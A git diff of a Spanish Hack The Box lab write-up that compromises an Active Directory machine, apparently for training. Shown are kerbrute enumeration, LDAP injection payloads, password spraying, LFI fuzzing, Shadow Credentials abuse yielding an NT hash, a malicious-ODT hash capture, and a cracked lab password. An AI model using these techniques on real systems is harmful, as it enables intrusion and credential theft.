@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Hercules - Hack The Box
-excerpt: "."
+excerpt: "Esta fue, sin duda, la máquina más difícil que he realizado en mi vida. Comenzamos con el análisis de la página web activa en el puerto 443, siendo solo un login. Le aplicamos Fuzzing, pero no encontramos algo útil. Hacemos la enumeración de usuarios vía Kerberos, logrando obtener la sintaxis usada para usuarios y una lista válida. Utilizamos la lista para aplicar inyecciones LDAP de forma automatizada con un script de Python. Logrando encontrar la contraseña de un usuario que descubrimos, es válida para otro usuario, después de aplicarle Password Spraying. Usamos al usuario y contraseña para entrar al login, obteniendo acceso. Revisando las funcionalidades de la máquina, descubrimos que es vulnerable a Local File Inclusion (LFI), descubriendo un archivo web.config que contiene los datos necesarios para forjar una cookie de Forms Authentication con ASP.NET, para que podamos obtener la sesión del usuario web_admin (Session Fixation). Creamos la cookie con un script de C# y Python, logrando suplantar al usuario web_admin. Revisando las funcionalidades de este usuario en la página, vemos que puede subir archivos de reporte. Le aplicamos un Sniper Attack con BurpSuite y descubrimos que podemos cargar archivos ODT. Aprovechamos esto para cargar un archivo malicioso ODT que nos permita capturar el Hash NTLMv2 de un usuario. Crackeamos este Hash y obtenemos la contraseña de otro usuario. Ocupamos estas credenciales para enumerar el AD usando bloodhound-python y BloodHoundV4.3.1, con tal de enumerar el AD. En la enumeración, descubrimos que podemos aplicar el Shadow Credentials Attack, generando TGTs y usando certi-py o bloodyAD para suplantar a algunos usuarios. Gracias a esto, logramos suplantar un usuario que nos permite tomar contro del OU Forest Migration. Usamos a este usuario para darnos permisos GenericAll sobre algunos grupos y habilitamos a usuarios deshabilitados que contienen ACLs que nos permiten identificar CAs vulnerables. Con este dato, logramos aplicar el ESC3 Certificate Attack: Enrollment Agent Template, que nos permite suplanta a otro usuario con mayores privilegios. Por último, rehabilitamos un usuario administrador que nos permite suplantar a otro usuario administrador, que tiene la capacidad de aplicar el S4U2self/S4U2proxy Abuse Chain Attack, con lo que logramos suplantar al usuario administrador del AD, logrando escalar privilegios máximos y ser dueño prácticamente de todo el AD."
 date: 2025-10-24
 classes: wide
 header:
@@ -14,20 +14,74 @@ categories:
 tags:
   - Windows
   - Active Directory
-  - 
+  - LDAP
+  - Kerberos
+  - Web Enumeration
+  - Fuzzing
+  - BurpSuite
+  - Kerberos Enumeration
+  - LDAP Injection
+  - Automating LDAP Injection with Python
+  - Password Spraying Attack
+  - Local File Inclusion (LFI)
+  - Session Fixation
+  - Forging FormsAuth Cookie with ASP.NET
+  - Sniper Attack
+  - Malicious ODT File
+  - Cracking Hash
+  - Cracking NTLMv2 Hash
+  - BloodHound and Python-BloodHound Enumeration
+  - Shadow Credentials Attack
+  - bloodyAD Enumeration
+  - OU Relocation (PowerView)
+  - OU Takeover Attack
+  - Rehabilitating Disabled AD Accounts
+  - Identifying Vulnerable CAs
+  - ESC3 Certificate Attack - Enrollment Agent Template
+  - S4U2self/S4U2proxy Abuse Chain
+  - Privesc - S4U2self/S4U2proxy Abuse Chain
   - OSCP Style
 ---
-![](/assets/images/htb-writeup-hercules/hercules.png)
+<p align="center">
+<img src="/assets/images/htb-writeup-hercules/hercules.png">
+</p>
 
-texto
+Esta fue, sin duda, la máquina más difícil que he realizado en mi vida. Comenzamos con el análisis de la página web activa en el **puerto 443**, siendo solo un login. Le aplicamos **Fuzzing**, pero no encontramos algo útil. Hacemos la enumeración de usuarios vía **Kerberos**, logrando obtener la sintaxis usada para usuarios y una lista válida. Utilizamos la lista para aplicar **inyecciones LDAP** de forma automatizada con un script de **Python**. Logrando encontrar la contraseña de un usuario que descubrimos, es válida para otro usuario, después de aplicarle **Password Spraying**. Usamos al usuario y contraseña para entrar al login, obteniendo acceso. Revisando las funcionalidades de la máquina, descubrimos que es vulnerable a **Local File Inclusion (LFI)**, descubriendo un archivo **web.config** que contiene los datos necesarios para forjar una cookie de **Forms Authentication** con **ASP.NET**, para que podamos obtener la sesión del usuario web_admin (**Session Fixation**). Creamos la cookie con un script de **C#** y **Python**, logrando suplantar al usuario web_admin. Revisando las funcionalidades de este usuario en la página, vemos que puede subir archivos de reporte. Le aplicamos un **Sniper Attack** con **BurpSuite** y descubrimos que podemos cargar **archivos ODT**. Aprovechamos esto para cargar un **archivo malicioso ODT** que nos permita capturar el **Hash NTLMv2** de un usuario. Crackeamos este Hash y obtenemos la contraseña de otro usuario. Ocupamos estas credenciales para enumerar el **AD** usando **bloodhound-python** y **BloodHoundV4.3.1**, con tal de enumerar el **AD**. En la enumeración, descubrimos que podemos aplicar el **Shadow Credentials Attack**, generando **TGTs** y usando **certi-py** o **bloodyAD** para suplantar a algunos usuarios. Gracias a esto, logramos suplantar un usuario que nos permite tomar contro del **OU Forest Migration**. Usamos a este usuario para darnos permisos **GenericAll** sobre algunos grupos y habilitamos a usuarios deshabilitados que contienen **ACLs** que nos permiten identificar **CAs** vulnerables. Con este dato, logramos aplicar el **ESC3 Certificate Attack: Enrollment Agent Template**, que nos permite suplanta a otro usuario con mayores privilegios. Por último, rehabilitamos un usuario administrador que nos permite suplantar a otro usuario administrador, que tiene la capacidad de aplicar el **S4U2self/S4U2proxy Abuse Chain Attack**, con lo que logramos suplantar al usuario administrador del AD, logrando escalar privilegios máximos y ser dueño prácticamente de todo el **AD**.
 
 Herramientas utilizadas:
 * *ping*
 * *nmap*
-* **
-* **
-* **
-* **
+* *Wappalizer*
+* *ffuf*
+* *gobuster*
+* *kerbrute*
+* *awk*
+* *wc*
+* *sed*
+* *BurpSuite*
+* *python3*
+* *netexec(nxc)*
+* *wget*
+* *chmod*
+* *dotnet*
+* *Inspector*
+* *Bad-ODF.py*
+* *responder*
+* *JohnTheRipper*
+* *bloodhound-python*
+* *BloodHoundV4.3.1*
+* *impacket-getTGT*
+* *certipy-ad*
+* *bloodyAD*
+* *PowerView*
+* *winrmexec*
+* *git*
+* *ntpdate*
+* *iconv*
+* *openssl*
+* *impacket-describeTicket*
+* *impacket-changepasswd*
+* *impacket-getST*
 
 
 <br>
@@ -43,17 +97,38 @@ Herramientas utilizadas:
 			</ul>
 		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
+				<li><a href="#HTTPS">Analizando Servicio HTTPS</a></li>
+				<li><a href="#fuzz">Fuzzing</a></li>
+				<li><a href="#kerberos">Enumeración de Servicio Kerberos</a></li>
+				<li><a href="#login">Análisis de Login de Página Web del Puerto 443</a></li>
 			</ul>
 		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#"></a></li>
-				<li><a href="#"></a></li>
+				<li><a href="#LDAP">Aplicando Inyecciones LDAP en Login</a></li>
+				<ul>
+					<li><a href="#pwdSpray">Aplicando Ataque Password Spraying para Identificar Reuso de Contraseña Dumpeada</a></li>
+				</ul>
+				<li><a href="#LFI">Aplicando Local File Inclusion (LFI) en Dashboard de Página Web</a></li>
+				<li><a href="#FormsAuth">Forjando Cookie de Forms Authentication de ASP.NET con un Script</a></li>
+				<li><a href="#LoginSniper">Analizando Login de Usuario web_admin y Aplicando Sniper Attack para Identificar Archivos Aceptados en Carga de Archivos</a></li>
+				<li><a href="#MaliciousODT">Cargando Archivo ODT Malicioso para Capturar y Crackear Hash Net NTLMv2</a></li>
+				<li><a href="#BloodHound">Investigando e Identificando Vector de Ataque con BloodHound</a></li>
+				<li><a href="#Shadow">Aplicando Shadow Credentials Attack Chain para Ganar Acceso a la Máquina AD</a></li>
+				<ul>
+					<li><a href="#bloodyAD">Enumeración de AD Usando Herramienta bloodyAD y Hash NT del Usuario bob.w</a></li>
+				</ul>
+				<li><a href="#MovingToOU">Moviendo Usuario stephen.m al OU Web Department para Abusar de sus ACLs y Podamos Ganar Acceso al AD como Usuario Auditor</a></li>
 			</ul>
 		<li><a href="#Post">Post Explotación</a></li>
 			<ul>
-				<li><a href="#"></a></li>
+				<li><a href="#FMigration">Asignando Dueño y Permiso GenericAll a Usuario Auditor sobre OU Forest Migration para Tener su Control Total</a></li>
+				<li><a href="#Fernando">Rehabilitando Cuenta Deshabilitada de Usuario Fernando.R</a></li>
+				<li><a href="#BadCAs">Identificando CAs Vulnerables y Aplicando ESC3 Certificate Attack: Enrollment Agent Template</a></li>
+				<ul>
+					<li><a href="#MovLateral">Aplicando un Movimiento Lateral para Autenticarnos como Usuario ashley.b</a></li>
+				</ul>
+				<li><a href="#IIS_Support">Rehabilitando Usuario IIS_Administrator para Modificar Contraseña de Usuario IIS_webserver$</a></li>
+				<li><a href="#AbuseChaing">Aplicando el Ataque S4U2self/S4U2proxy Abuse Chain para Escalar Privilegios</a></li>
 			</ul>
 		<li><a href="#Links">Links de Investigación</a></li>
 	</ul>
@@ -167,7 +242,7 @@ Nmap done: 1 IP address (1 host up) scanned in 53.15 seconds
 
 <br>
 
-Son bastantes puertos y veo algunos como el **puerto 88**, que es del **servicio Kerberos**, que nos indican que nos enfrentamos a una máquina tipo **Active Directory**.
+Son bastantes puertos y veo algunos como el **puerto 88**, que es del **servicio Kerberos**, que nos indica que nos enfrentamos a una máquina tipo **Active Directory**.
 
 <br>
 
@@ -300,7 +375,7 @@ Entremos:
 
 Al meter la IP nos redirige a la página web del **puerto 443**.
 
-Parece ser una página web de una empresa que crea software, aplicaciones web y móbiles, etc.
+Parece ser una página web de una empresa que crea software, aplicaciones web y móviles, etc.
 
 Veamos qué nos dice **Wappalizer**:
 
@@ -421,7 +496,7 @@ De entre todos los directorios que descubrimos, vemos uno que es un login:
 <img src="/assets/images/htb-writeup-hercules/Captura3.png">
 </p>
 
-Ahí vemos un icono que al darle clic, nos dará un mensaje:
+Ahí vemos un icono que, al darle clic, nos dará un mensaje:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-hercules/Captura4.png">
@@ -465,7 +540,7 @@ Después de dejarlo bastante tiempo corriendo, obtenemos un usuario que nos da u
 
 Entonces, vamos a crear un wordlist que tenga nombre de usuarios, pero siguiendo esta sintaxis.
 
-Utilizaremos como plantilla el wordlist `/usr/share/wordlists/seclists/Usernames/Names/names.txt`, ya que solo contiene nombre reales de personas:
+Utilizaremos como plantilla el wordlist `/usr/share/wordlists/seclists/Usernames/Names/names.txt`, ya que solo contiene nombres reales de personas:
 ```bash
 awk 'NF{ for(i=97;i<=122;i++) printf "%s.%c\n", $0, i }' /usr/share/wordlists/seclists/Usernames/Names/names.txt > names_ad.txt
 
@@ -474,11 +549,11 @@ wc -l names_ad.txt
 ```
 Ya tenemos nuestro wordlist.
 
-Solo expliquemos rapidamente este comando:
+Solo expliquemos rápidamente este comando:
 * **NF** evita líneas vacías. 
 * El bucle `i=97..122` imprime `nombre.<letra>` usando el **código ASCII**.
 
-Utilicemos este wordlist y veamos cuantos usuarios podemos obtener:
+Utilicemos este wordlist y veamos cuántos usuarios podemos obtener:
 ```bash
 ./kerbrute_linux_386 userenum --dc 10.10.11.91 -d hercules.htb names_ad.txt -t 150
 
@@ -544,7 +619,7 @@ Muy bien, estos wordlists nos pueden servir para más adelante.
 
 <h2 id="login">Análisis de Login de Página Web del Puerto 443</h2>
 
-La idea es identificar si es posible que podamos abusar de este login, siendo la principal el ver como trata la data que le damos.
+La idea es identificar si es posible que podamos abusar de este login, siendo la principal el ver cómo trata la data que le damos.
 
 Captura un intento de sesión con **BurpSuite** y envía la captura al **Repeater**:
 
@@ -552,9 +627,9 @@ Captura un intento de sesión con **BurpSuite** y envía la captura al **Repeate
 <img src="/assets/images/htb-writeup-hercules/Captura5.png">
 </p>
 
-Algo muy común en ambientes **AD** es utilizar el **servicio LDAP** como metodo de autenticación en otros servicios/protocolos.
+Algo muy común en ambientes **AD** es utilizar el **servicio LDAP** como método de autenticación en otros servicios/protocolos.
 
-Posiblemente este login utilice **LDAP** para la autenticación.
+Posiblemente, este login utilice **LDAP** para la autenticación.
 
 Podemos aplicar **inyecciones LDAP** para confirmar no solo si se usa **LDAP** en el login, sino que podemos explotarlo para tratar de ganar acceso.
 
@@ -572,7 +647,7 @@ Vamos a probarlo.
 
 <h2 id="LDAP">Aplicando Inyecciones LDAP en Login</h2>
 
-Para que podamos entender como funcionan las **Inyecciones LDAP**, primero debemos saber como es que se contruyen las consultas en **LDAP**, que son conocidas como **Filtros LDAP**:
+Para que podamos entender cómo funcionan las **Inyecciones LDAP**, primero debemos saber cómo es que se construyen las consultas en **LDAP**, que son conocidas como **Filtros LDAP**:
 
 | **Filtro LDAP** |
 |:---------------:|
@@ -585,7 +660,7 @@ Esta es la sintaxis que se utiliza: `(<atributo><operador><valor>)`.
 Para el caso de los atributos, te dejo un link que muestra una lista con los **nombres de atributos LDAP** que se utilizan en un **AD**:
 * <a href="https://documentation.sailpoint.com/connectors/active_directory/help/integrating_active_directory/ldap_names.html" target="_blank">List of LDAP Attribute Names and Associated Name in Active Directory</a>
 
-De acuerdo a esta lista, posiblemente el filtro que se ocupe en el login, sea alguno de estos:
+De acuerdo con esta lista, posiblemente el filtro que se ocupe en el login, sea alguno de estos:
 ```bash
 (cn=will.s*)(password=contraseña)
 (sAMAccountName=will.s*)(description=a*)
@@ -611,7 +686,7 @@ Ahora sí, ¿Qué son las **Inyecciones LDAP**?
 
 Entonces, debemos enfocar las inyecciones en el parámetro **username**.
 
-Nuestro objetivo es descubrir, cuál de todos los usuarios que hemos capturado es valido para este login.
+Nuestro objetivo es descubrir, cuál de todos los usuarios que hemos capturado es válido para este login.
 
 Aquí te dejo un par de blogs que tienen payloads para **Inyecciones LDAP**:
 * <a href="https://www.verylazytech.com/ldap-injection" target="_blank">LDAP Injection</a>
@@ -636,7 +711,7 @@ Obtenemos un **invalid username**.
 
 Esto como tal no nos dice nada, solo que es posible el uso de **LDAP** en el login.
 
-Vamos a enfocar la inyección para identificar ya sea el atributo **password** o **description**.
+Vamos a enfocar la inyección para identificar, ya sea, el atributo **password** o **description**.
 
 Utiliza el siguiente payload:
 ```bash
@@ -660,13 +735,13 @@ Aplica cualquiera de los dos:
 <img src="/assets/images/htb-writeup-hercules/Captura8.png">
 </p>
 
-Observa que en ambos casos, nos da el mensaje que el intento de login es fallido, por lo que el usuario lo toma como valido.
+Observa que, en ambos casos, nos da el mensaje de que el intento de login es fallido, por lo que el usuario lo toma como válido.
 
-Esto nos indica que en efecto, se esta utilizando el **servicio LDAP** para este login.
+Esto nos indica qué en efecto, se está utilizando el **servicio LDAP** para este login.
 
-Al igual que con las **Inyecciones SQL**, podemos tratar de aplicar fuerza bruta para obtener el contenido del atributo **password o description**, esto funcionaria porque:
-* Tenemos una forma de validar si la inyección fue exitosa, siendo el mensaje **Invalid login attempt** el indicador de exito.
-* En la inyección, utilizariamos varios caracteres para saber cual es valido, siendo así que dumpeariamos el contenido de cualquier atributo.
+Al igual que con las **Inyecciones SQL**, podemos tratar de aplicar fuerza bruta para obtener el contenido del atributo **password o description**. Esto funcionaría porque:
+* Tenemos una forma de validar si la inyección fue exitosa, siendo el mensaje **Invalid login attempt** el indicador de éxito.
+* En la inyección, utilizaríamos varios caracteres para saber cuál es válido, siendo así que dumpeariamos el contenido de cualquier atributo.
 * La mejor opción sería utilizar el atributo **description**, ya que puede contener información privilegiada por error.
 
 La inyección sería la siguiente:
@@ -676,7 +751,7 @@ La inyección sería la siguiente:
 <usuario2>)(description=<caracter1>*
 ...
 ```
-Y así sucecivamente.
+Y así sucesivamente.
 
 El problema es que sería tardado ir de usuario por usuario, probando si la inyección nos permite obtener el contenido de este atributo.
 
@@ -882,7 +957,7 @@ Aun así, esta contraseña puede pertenecer a otro usuario y para evitar cualqui
 
 <h3 id="pwdSpray">Aplicando Ataque Password Spraying para Identificar Reuso de Contraseña Dumpeada</h3>
 
-Para este ataque, podemos usar **netexec** de forma similar a como lo aplicamos con **crackmapexec**:
+Para este ataque, podemos usar **netexec** de forma similar a cómo lo aplicamos con **crackmapexec**:
 ```bash
 nxc ldap 10.10.11.91 -u only_names.txt -p 'change*th1s_p@ssw()rd!!' -k --continue-on-success
 LDAP        10.10.11.91     389    DC               [*] None (name:DC) (domain:hercules.htb)
@@ -913,7 +988,7 @@ Version: v1.0.3 (9dad6e1) - 10/27/25 - Ronnie Flathers @ropnop
 ```
 De igual forma, obtenemos al **usuario ken.w**.
 
-Como es la contraseña valida para **LDAP**, podemos probarla en el login y ver si nos da acceso:
+Como es la contraseña válida para **LDAP**, podemos probarla en el login y ver si nos da acceso:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-hercules/Captura9.png">
@@ -931,13 +1006,13 @@ Navegando un poco en el Dashboard, vemos que hay 3 mensajes para nosotros en la 
 <img src="/assets/images/htb-writeup-hercules/Captura10.png">
 </p>
 
-Revisando estos mensajes, uno de estos nos indican la razón del uso de credenciales LDAP para entrar al login:
+Revisando estos mensajes, uno de estos nos indica la razón del uso de **credenciales LDAP** para entrar al login:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-hercules/Captura11.png">
 </p>
 
-El segundo nos indica que nuestra cuenta fue hackeada y debemos cambiar la contraseña inmediatamente, dandonos un dominio interno para realizar ese cambio:
+El segundo nos indica que nuestra cuenta fue hackeada y debemos cambiar la contraseña inmediatamente, dándonos un dominio interno para realizar ese cambio:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-hercules/Captura12.png">
@@ -961,7 +1036,7 @@ Esta clase de parámetros pueden ser vulnerables a **Local File Inclusion** o **
 
 Podemos comprobarlo aplicando **Fuzzing** a este parámetro, usando un wordlist con ruta del **servidor IIS** de **Windows**.
 
-Usare la herramienta **ffuf** y será necesario copiar la cookie de sesión:
+Usaré la herramienta **ffuf** y será necesario copiar la cookie de sesión:
 ```bash
 ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/Web-Servers/IIS.txt:FUZZ -u 'https://hercules.htb/Home/Download?fileName=../../FUZZ' -t 300 -b "__RequestVerificationToken=...; .ASPXAUTH=..." -fs 0,485
 
@@ -1002,7 +1077,7 @@ web.config              [Status: 200, Size: 4896, Words: 643, Lines: 94, Duratio
 
 Tenemos un resultado.
 
-Revisemoslo:
+Revisémoslo:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-hercules/Captura15.png">
@@ -1026,7 +1101,7 @@ Analizando este archivo, podemos ver una sección interesante que es la etiqueta
 
 La idea es que con estas llaves podamos crear una cookie de sesión válida de algún usuario.
 
-Sin embargo, tenemos que tener en cuenta el proceso que **ASP.NET** (en versiones anteriores a **ASP.NET Core**) usa para proteger las cookies de autenticación, pues si revisas la cookie del login, verás una cookie llamda **.ASPXAUTH**.
+Sin embargo, tenemos que tener en cuenta el proceso que **ASP.NET** (en versiones anteriores a **ASP.NET Core**) usa para proteger las cookies de autenticación, pues sí revisas la cookie del login, verás una cookie llamda **.ASPXAUTH**.
 
 | **Cookie .ASPXAUTH** |
 |:--------------------:|
@@ -1034,7 +1109,7 @@ Sin embargo, tenemos que tener en cuenta el proceso que **ASP.NET** (en versione
 
 <br>
 
-Esto se vuelve más complejo, pues para que podamos formar una cookie valida debemos tener también en cuenta la compatibilidad entre cookies de sesión viejas y modernas, pues puede que tengamos algun problema a la hora de forjar una cookie solo para versiones viejas de **ASP.NET**.
+Esto se vuelve más complejo, pues para que podamos formar una cookie válida debemos tener también en cuenta la compatibilidad entre cookies de sesión viejas y modernas, pues puede que tengamos algún problema a la hora de forjar una cookie solo para versiones viejas de **ASP.NET**.
 
 Por esta razón fue creado el paquete **AspNetCore.LegacyAuthCookieCompat**, para resolver esa incompatibilidad:
 
@@ -1050,7 +1125,7 @@ Para eso utilizaremos un script de **Python** que automatiza el uso de un script
 
 Este script utiliza **dotnet**, por lo que debes tenerlo instalado en tu máquina.
 
-Yo lo instale de la siguiente manera:
+Yo lo instalé de la siguiente manera:
 ```bash
 # Descargando instalador de dotnet
 wget https://dot.net/v1/dotnet-install.sh -O dotnet-install.sh
@@ -1200,7 +1275,7 @@ Encrypted FormsAuth Ticket:
 F44A8A86A97127947E859D90E487A...
 ```
 
-Copia la cookie y pegala en la sesión actual de la página web utilizando el **Inspector** de tu navegador:
+Copia la cookie y pégala en la sesión actual de la página web utilizando el **Inspector** de tu navegador:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-hercules/Captura16.png">
@@ -1216,7 +1291,7 @@ Muy bien, somos el **usuario web_admin**.
 
 <br>
 
-<h2 id="Sniper">Analizando Login de Usuario web_admin y Aplicando Sniper Attack para Identificar Archivos Aceptados en Carga de Archivos</h2>
+<h2 id="LoginSniper">Analizando Login de Usuario web_admin y Aplicando Sniper Attack para Identificar Archivos Aceptados en Carga de Archivos</h2>
 
 Tenemos dos mensajes en el dashboard de este usuario.
 
@@ -1226,13 +1301,13 @@ Observa que uno de estos es un mensaje del **usuario johnathan** pidiendo un cam
 <img src="/assets/images/htb-writeup-hercules/Captura18.png">
 </p>
 
-Y vemos otro mensaje que nos da una pista de que podemos hacer:
+Y vemos otro mensaje que nos da una pista de qué podemos hacer:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-hercules/Captura19.png">
 </p>
 
-El punto 4 nos menciona que como este usuario, ya podemos cargar archivos, cosa que con el **usuario ken.w** no nos permitia:
+El punto 4 nos menciona que, como este usuario, ya podemos cargar archivos, cosa que con el **usuario ken.w** no nos permitía:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-hercules/Captura20.png">
@@ -1242,15 +1317,15 @@ El punto 4 nos menciona que como este usuario, ya podemos cargar archivos, cosa 
 <img src="/assets/images/htb-writeup-hercules/Captura21.png">
 </p>
 
-Pero no sabemos que clase de archivos podemos subir, por lo que debemos identificar que clase de archivos nos acepta.
+Pero no sabemos qué clase de archivos podemos subir, por lo que debemos identificar qué clase de archivos nos acepta.
 
 Si bien podemos aplicar un **Sniper Attack** con el **Intruder** de **BurpSuite**, al ser una máquina **Windows**, debe de aceptar archivos que solo se puedan ejecutar en este **SO**.
 
-Aun así puedes aplicar el ataque.
+Aun así, puedes aplicar el ataque.
 
 **CUIDADO**: la cookie de sesión que obtuvimos con el script tiene una duración, por lo que el ataque puede fallar en cierto punto.
 
-Realiza una captura de la carga de archivos y enviala al **Repeater**:
+Realiza una captura de la carga de archivos y envíala al **Repeater**:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-hercules/Captura22.png">
@@ -1264,7 +1339,7 @@ Pasando un poco de tiempo, vemos que nuestra cookie deja de funcionar:
 <img src="/assets/images/htb-writeup-hercules/Captura23.png">
 </p>
 
-Logramos ver que se intento enviar un **archivo ODT**, que podemos probarlo si lo mandamos al **Repeater** y le cambiamos la cookie:
+Logramos ver que se intentó enviar un **archivo ODT**, que podemos probarlo si lo mandamos al **Repeater** y le cambiamos la cookie:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-hercules/Captura24.png">
@@ -1274,7 +1349,7 @@ Logramos ver que se intento enviar un **archivo ODT**, que podemos probarlo si l
 <img src="/assets/images/htb-writeup-hercules/Captura25.png">
 </p>
 
-Excelente, si esta aceptando **archivos ODT**.
+Excelente, si está aceptando **archivos ODT**.
 
 Ya tenemos una pista de lo que debemos hacer.
 
@@ -1282,7 +1357,7 @@ Ya tenemos una pista de lo que debemos hacer.
 
 <h2 id="MaliciousODT">Cargando Archivo ODT Malicioso para Capturar y Crackear Hash Net NTLMv2</h2>
 
-La idea es que podamos crear un **archivo ODT** malicioso que al momento de ser cargado, nos mande o una **Reverse Shell** o comparta el **Hash NTLMv2** del usuario que tenga nuestro archivo.
+La idea es que podamos crear un **archivo ODT** malicioso que, al momento de ser cargado, nos mande o una **Reverse Shell** o comparta el **Hash NTLMv2** del usuario que tenga nuestro archivo.
 
 La mejor opción es irnos por lo segundo.
 
@@ -1352,7 +1427,7 @@ Espera un poco y observa el **responder**:
 ```
 Obtuvimos el Hash del **usuario natalie.a**.
 
-Copialo y guardalo en un archivo de texto, luego usa **JohnTheRipper** para crackearlo:
+Cópialo y guárdalo en un archivo de texto, luego usa **JohnTheRipper** para crackearlo:
 ```bash
 nano natalieHash
 john -w:/usr/share/wordlists/rockyou.txt natalieHash
@@ -1373,7 +1448,7 @@ nxc ldap 10.10.11.91 -u 'natalie.a' -p 'Prettyprincess123!' -k
 LDAP        10.10.11.91     389    DC               [*] None (name:DC) (domain:hercules.htb)
 LDAP        10.10.11.91     389    DC               [+] hercules.htb\natalie.a:Prettyprincess123!
 ```
-Si funciona, pero no nos servira para ganar acceso a la máquina.
+Sí funciona, pero no nos servirá para ganar acceso a la máquina.
 
 <br>
 
@@ -1404,7 +1479,7 @@ Si investigamos al **usuario natalie.a**, veremos que pertenece al grupo **Web S
 <img src="/assets/images/htb-writeup-hercules/Captura27.png">
 </p>
 
-Y dentro de este grupo, veremos que también esta el **usuario ken.w** y el **usuario johnathan.j**:
+Y dentro de este grupo, veremos que también está el **usuario ken.w** y el **usuario johnathan.j**:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-hercules/Captura28.png">
@@ -1426,7 +1501,7 @@ Investigando las rutas más cortas a los **Domain Admins**, veremos que el **usu
 <img src="/assets/images/htb-writeup-hercules/Captura29.png">
 </p>
 
-Este mismo usuario, pertenece al grupo **Remote Management Users**, que es el grupo que puede conectarse remotamente al **AD**:
+Este mismo usuario pertenece al grupo **Remote Management Users**, que es el grupo que puede conectarse remotamente al **AD**:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-hercules/Captura30.png">
@@ -1434,13 +1509,13 @@ Este mismo usuario, pertenece al grupo **Remote Management Users**, que es el gr
 
 Y ahí vemos a otro usuario llamado **ashley.b**, siendo otro posible usuario al que podemos apuntar.
 
-Podemos ver a que otros grupos pertenece el **usuario auditor** y los permisos que tiene sobre ellos:
+Podemos ver a qué otros grupos pertenece el **usuario auditor** y los permisos que tiene sobre ellos:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-hercules/Captura31.png">
 </p>
 
-Ahí podemos ver 2 grupos de nuestro interes, siendo el grupo **Helpdesk Administrators y Security Helpdesk**, pues ambos grupos tienen el **permiso ForceChangePassword** sobre el **usuario auditor**:
+Ahí podemos ver 2 grupos de nuestro interés, siendo el grupo **Helpdesk Administrators y Security Helpdesk**, pues ambos grupos tienen el **permiso ForceChangePassword** sobre el **usuario auditor**:
 
 | **Permiso ForceChangePassword** |
 |:-------------------------------:|
@@ -1472,19 +1547,19 @@ Siendo que hay 6 usuarios aquí:
 * El **usuario camilla.b**.
 * Y el **usuario mikayla.a**.
 
-Lo interesante comienza cuando analizamos al **usuario bob.w**, pues podemos notar que como en otros usuarios, tiene un certificado de autenticación creado:
+Lo interesante comienza cuando analizamos al **usuario bob.w**, pues podemos notar que, como en otros usuarios, tiene un certificado de autenticación creado:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-hercules/Captura34.png">
 </p>
 
-Observa que tenemos activo el grupo **Enterprise Key Admins** y vemos como se relaciona con todo el dominio:
+Observa que tenemos activo el grupo **Enterprise Key Admins** y vemos cómo se relaciona con todo el dominio:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-hercules/Captura35.png">
 </p>
 
-Además, nuesro **usuario natalie.a**, también se le ha creado un certificado de autenticación:
+Además, nuestro **usuario natalie.a**, también se le ha creado un certificado de autenticación:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-hercules/Captura36.png">
@@ -1504,7 +1579,7 @@ Esto puede dar pie al **Shadow Credentials Attack Chain**.
 
 <br>
 
-Te dejo estos blogs que explican como aplicar este ataque:
+Te dejo estos blogs que explican cómo aplicar este ataque:
 * <a href="https://www.hackingarticles.in/shadow-credentials-attack/" target="_blank">Shadow Credentials Attack</a>
 * <a href="https://medium.com/@NightFox007/exploiting-and-detecting-shadow-credentials-and-msds-keycredentiallink-in-active-directory-9268a587d204" target="_blank">Exploiting and Detecting Shadow Credentials and msDS-KeyCredentialLink in Active Directory</a>
 
@@ -1517,8 +1592,8 @@ Para realizar este ataque, ocuparemos la herramienta **certipy-ad**:
 <br>
 
 La idea es la siguiente:
-* Utilizar a nuestro **usuario natalie.a** para poder crear un certificado de autenticación valido del **usuario bob.w**, sin que tengamos su contraseña.
-* El objetivo es poder llegar al **usuario auditor** para poder ganar acceso a la máquina AD.
+* Utilizar a nuestro **usuario natalie.a** para poder crear un certificado de autenticación válido del **usuario bob.w**, sin que tengamos su contraseña.
+* El objetivo es poder llegar al **usuario auditor** para poder ganar acceso a la máquina **AD**.
 * Quizá podamos usar al **usuario bob.w** para más enumeración.
 
 Para hacer esto, primero necesitamos un **TGT** del **usuario natalie.a**:
@@ -1554,7 +1629,7 @@ Certipy  v5.0.3 - by Oliver Lyak (ly4k)
 [*] Successfully restored the old Key Credentials for 'bob.w'
 [*] NT hash for 'bob.w': 8a65c74e8f0073babbfac6725c66cc3f
 ```
-Funciono, tenemos un **Hash NT** del **usuario bob.w**.
+Funcionó, tenemos un **Hash NT** del **usuario bob.w**.
 
 Creamos un nuevo **TGT**, pero ahora del **usuario bob.w**:
 ```bash
@@ -1565,13 +1640,13 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 ```
 Lo tenemos, ahora podemos usar el **TGT** de este usuario para otras cosas.
 
-Una de estas es enumerar el **AD** de nuevo, pero con la intención de ver que permisos de escritura tiene este usuario.
+Una de estas es enumerar el **AD** de nuevo, pero con la intención de ver qué permisos de escritura tiene este usuario.
 
 <br>
 
 <h3 id="bloodyAD">Enumeración de AD Usando Herramienta bloodyAD y Hash NT del Usuario bob.w</h3>
 
-¿Para que sirve la herramienta **bloodyAD**?
+¿Para qué sirve la herramienta **bloodyAD**?
 
 | **BloodyAD** |
 |:------------:|
@@ -1641,7 +1716,7 @@ userCertificate: WRITE
 ...
 ```
 
-Del resultado de este comando, deje la mayoria de lo que es importante y lo resumo:
+Del resultado de este comando, dejé la mayoría de lo que es importante y lo resumo:
